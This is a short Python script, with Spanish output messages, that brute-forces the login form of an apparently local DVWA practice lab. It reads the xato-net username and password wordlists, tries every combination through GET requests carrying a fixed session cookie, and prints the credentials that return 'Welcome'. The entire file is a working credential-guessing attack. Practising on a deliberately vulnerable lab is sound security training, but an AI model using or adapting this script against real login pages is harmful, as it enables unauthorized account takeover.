import requests

url = "http://127.0.0.1/vulnerabilities/brute/"
cookies = {
    "PHPSESSID": "rb8ggfckh9svp1rvbh24hhme64",
    "security": "low"
}


path_users = "/home/juan-pablo/Imágenes/Capturas de pantalla/xato-net-10-million-usernames-dup.txt"
path_passwords = "/home/juan-pablo/Imágenes/Capturas de pantalla/xato-net-10-million-passwords-100.txt"

def brute_force_files():
    try:
        
        with open(path_users, 'r') as u_file, open(path_passwords, 'r') as p_file:
           
            users = [u.strip() for u in u_file.readlines()]
            passwords = [p.strip() for p in p_file.readlines()]

        print(f"Iniciando ataque con {len(users)} usuarios y {len(passwords)} claves")

        for user in users:
            for password in passwords:
                params = {
                    'username': user,
                    'password': password,
                    'Login': 'Login'
                }
                
                response = requests.get(url, params=params, cookies=cookies)
                
                if "Welcome" in response.text:
                    print(f"[+] valido -> {user}:{password}")
                else:
                    print(f"[-] invalido: {user}:{password}", end='\r')

    except FileNotFoundError:
        print("Error: No se encontró uno de los archivos de diccionario.")

if __name__ == "__main__":
    brute_force_files()